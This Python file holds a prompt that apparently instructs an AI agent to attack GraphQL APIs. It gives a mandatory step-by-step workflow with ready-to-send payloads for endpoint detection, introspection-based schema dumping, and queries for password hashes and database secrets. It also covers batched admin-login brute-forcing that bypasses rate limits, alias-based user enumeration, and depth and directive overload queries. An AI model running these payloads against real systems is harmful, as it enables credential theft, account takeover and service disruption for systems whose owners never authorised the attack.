"""
GraphQL Attack Skill Prompt.
"""
GRAPHQL_SKILL_PROMPT = """
## ATTACK SKILL: GRAPHQL ATTACKS

**CRITICAL: This attack skill has been CLASSIFIED as GraphQL attack.**

### MANDATORY GRAPHQL WORKFLOW

#### STEP 1: DETECTION

Common GraphQL endpoints: `/graphql`, `/api/graphql`, `/v1/graphql`, `/gql`, `/query`

Try the universal query:
```graphql
{__typename}
```
Returns `{"data": {"__typename": "Query"}}` → GraphQL confirmed.

#### STEP 2: INTROSPECTION ABUSE

```graphql
query {
  __schema {
    types { name fields { name type { name kind ofType { name kind } } } }
  }
}
```
→ Dumps the entire schema: all types, fields, mutations, subscriptions, deprecated fields.

#### STEP 3: AUTH BYPASS / IDOR

Use introspection to find hidden queries:
```graphql
query {
  users { id email password_hash role }
  adminConfig { secretKey dbPassword }
}
```

#### STEP 4: BATCHING ATTACK (Bypass Rate Limits)

```graphql
[{"query": "mutation { login(user:\"admin\",pass:\"pass1\") { token } }"},
 {"query": "mutation { login(user:\"admin\",pass:\"pass2\") { token } }"},
 {"query": "mutation { login(user:\"admin\",pass:\"pass3\") { token } }"}]
```
→ 3 login attempts in 1 HTTP request, bypassing rate limiting.

#### STEP 5: ALIAS-BASED BRUTE-FORCE

```graphql
query {
  a: user(id:1) { email }
  b: user(id:2) { email }
  c: user(id:3) { email }
}
```

#### STEP 6: DIRECTIVE OVERLOAD / DEPTH ATTACK

```graphql
query { __typename @skip(if:false) @include(if:true) }
query { a { b { c { d { e { f { __typename } } } } } } }
```

#### ANTI-PATTERNS: Never skip introspection. Don't ignore deprecated fields — they often bypass new security controls.
"""
